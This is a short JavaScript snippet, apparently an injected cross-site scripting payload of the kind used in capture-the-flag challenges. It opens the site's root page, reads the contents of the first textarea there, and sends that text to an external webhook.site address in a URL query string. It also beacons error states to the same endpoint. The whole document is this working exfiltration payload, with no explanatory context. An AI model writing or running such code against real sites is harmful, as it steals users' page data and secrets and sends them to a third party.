(function() {
  
    const webhookUrl = "https://webhook.site/673c6b56-0dc4-4adb-b539-55c517084bb6";
    const root = window.open("/");

if (!root) {
    window.open(webhookUrl + "?data=error-in-root-window-open")
} else {
  root.addEventListener("load", () => {
    const textarea = root.document.querySelector("textarea");
    if (textarea) {
      window.open(webhookUrl + "?data=" + textarea.value);
    } else {
      window.open(webhookUrl + "?data=root-did-not-load");
    }
  });
}
})();
